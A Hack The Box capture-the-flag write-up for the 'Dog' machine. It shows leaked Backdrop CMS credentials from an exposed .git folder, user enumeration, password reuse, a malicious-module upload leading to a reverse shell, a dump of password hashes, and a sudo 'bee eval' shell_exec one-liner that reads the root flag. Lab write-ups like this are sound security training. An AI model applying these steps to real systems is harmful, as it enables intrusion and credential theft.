# Dog - HTB Write-up

## Initial portscan
```shell
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
|_  256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Home | Dog
| http-robots.txt: 22 disallowed entries (15 shown)
| /core/ /profiles/ /README.md /web.config /admin 
| /comment/reply /filter/tips /node/add /search /user/register 
|_/user/password /user/login /user/logout /?q=admin /?q=comment/reply
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
| http-git: 
|   10.129.70.157:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Port 22 - SSH

## Port 80 - HTTP
In the portscan, nmap enumerated the default scripts for http, one of them is `http-robots.txt`.

This file contains paths that must not be indexes by crawlers.

```shell
| /core/ /profiles/ /README.md /web.config /admin 
| /comment/reply /filter/tips /node/add /search /user/register 
|_/user/password /user/login /user/logout /?q=admin /?q=comment/reply
```

### /code
In this directory we can find:

```shell
[PARENTDIR]	Parent Directory	 	- 	 
[ ]	authorize.php	2024-03-07 17:02 	7.1K	 
[ ]	cron.php	2024-03-07 17:02 	1.0K	 
[DIR]	includes/	2024-07-08 02:31 	- 	 
[ ]	install.php	2024-03-07 17:02 	1.3K	 
[DIR]	layouts/	2024-07-08 02:31 	- 	 
[DIR]	misc/	2024-07-08 02:31 	- 	 
[DIR]	modules/	2024-07-08 02:31 	- 	 
[DIR]	profiles/	2024-07-08 02:31 	- 	 
[DIR]	scripts/	2024-07-08 02:31 	- 	 
[DIR]	themes/	2024-07-08 02:31 	- 	 
[ ]	update.php	2024-03-07 17:02 	22K	 
Apache/2.4.41 (Ubuntu) Server at 10.129.70.157 Port 80
```

## .git directory

### MySQL root access?
```php
$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
```
`root` / `BackDropJ2024DS2024`

### Password salt
```php
$settings['hash_salt'] = 'aWFvPQNGZSz1DQ701dD4lC5v1hQW34NefHvyZUzlThQ';`
```

## BackDropScan
Using `https://github.com/FisMatHack/BackDropScan`we can userenum and password spray.

### BackDrop version
❯ python BackDropScan.py --url $url --version
[+] Version: 1.27.1

### User enumeration
```shell
❯ python BackDropScan.py --url $url --userslist /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt --userenum
[+] Valid username: john
```

```shell
git/files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json:        "tiffany@dog.htb"
```

### BackDrop: Tiffany user
`tiffany` / `BackDropJ2024DS2024`

With this user, login to admin panel and upload an exploitable module.

`https://www.exploit-db.com/exploits/52021`

Get a revserse shel as `www-data`.

## Lateral movement
Use the password `BackDropJ2024DS2024` to log in as `dogBackDropSystem` user.

Use the previously obtained `root` credential to login into MySQL.

```shell
+-----+-------------------+---------------------------------------------------------+----------------------------+-----------+------------------+------------+------------+------------+------------+--------+----------+----------+---------+----------------------------+------------+
| uid | name              | pass                                                    | mail                       | signature | signature_format | created    | changed    | access     | login      | status | timezone | language | picture | init                       | data       |
+-----+-------------------+---------------------------------------------------------+----------------------------+-----------+------------------+------------+------------+------------+------------+--------+----------+----------
|   0 |                   |                                                         |                            |           | NULL             |          0 |          0 |          0 |          0 |      0 | NULL     |          |       0 |                            | NULL       |
|   1 | jPAdminB          | $S$E7dig1GTaGJnzgAXAtOoPuaTjJ05fo8fH9USc6vO87T./ffdEr/. | jPAdminB@dog.htb           |           | NULL             | 1720548614 | 1720584122 | 1720714603 | 1720584166 |      1 | UTC      |          |       0 | jPAdminB@dog.htb           | 0x623A303B |
|   2 | jobert            | $S$E/F9mVPgX4.dGDeDuKxPdXEONCzSvGpjxUeMALZ2IjBrve9Rcoz1 | jobert@dog.htb             |           | NULL             | 1720584462 | 1720584462 | 1720632982 | 1720632780 |      1 | UTC      |          |       0 | jobert@dog.htb             | NULL       |
|   3 | dogBackDropSystem | $S$EfD1gJoRtn8I5TlqPTuTfHRBFQWL3x6vC5D3Ew9iU4RECrNuPPdD | dogBackDroopSystem@dog.htb |           | NULL             | 1720632880 | 1720632880 | 1723752097 | 1723751569 |      1 | UTC      |          |       0 | dogBackDroopSystem@dog.htb | NULL       |
|   5 | john              | $S$EYniSfxXt8z3gJ7pfhP5iIncFfCKz8EIkjUD66n/OTdQBFklAji. | john@dog.htb               |           | NULL             | 1720632910 | 1720632910 |          0 |          0 |      1 | UTC      |          |       0 | john@dog.htb               | NULL       |
|   6 | morris            | $S$E8OFpwBUqy/xCmMXMqFp3vyz1dJBifxgwNRMKktogL7VVk7yuulS | morris@dog.htb             |           | NULL             | 1720632931 | 1720632931 |          0 |          0 |      1 | UTC      |          |       0 | morris@dog.htb             | NULL       |
|   7 | axel              | $S$E/DHqfjBWPDLnkOP5auHhHDxF4U.sAJWiODjaumzxQYME6jeo9qV | axel@dog.htb               |           | NULL             | 1720632952 | 1720632952 |          0 |          0 |      1 | UTC      |          |       0 | axel@dog.htb               | NULL       |
|   8 | rosa              | $S$EsV26QVPbF.s0UndNPeNCxYEP/0z2O.2eLUNdKW/xYhg2.lsEcDT | rosa@dog.htb               |           | NULL             | 1720632982 | 1720632982 |          0 |          0 |      1 | UTC      |          |       0 | rosa@dog.htb               | NULL       |
|  10 | tiffany           | $S$EEAGFzd8HSQ/IzwpqI79aJgRvqZnH4JSKLv2C83wUphw0nuoTY8v | tiffany@dog.htb            |           | NULL             | 1723752136 | 1723752136 | 1741728261 | 1741721008 |      1 | UTC      |          |       0 | tiffany@dog.htb            | NULL       |
+-----+-------------------+---------------------------------------------------------+----------------------------+-----------+------------------+------------+------------+------------+------------+--------+----------+----------+---------+----------------------------+------------+
```

`/etc/passwd`
```shell
root:x:0:0:root:/root:/bin/bash
jobert:x:1000:1000:jobert:/home/jobert:/bin/bash
johncusack:x:1001:1001:,,,:/home/johncusack:/bin/bash
```

## Privilege Escalation
Notice by rrunning `sudo -l` that user can run `/usr/local/bin/bee` as root.

The `bee` command is an cmd-like interface for the webapp, it can run `eval` code, so lets take the flag.
`sudo /usr/local/bin/bee --root=/var/www/html eval "echo shell_exec('cat /root/root.txt');"`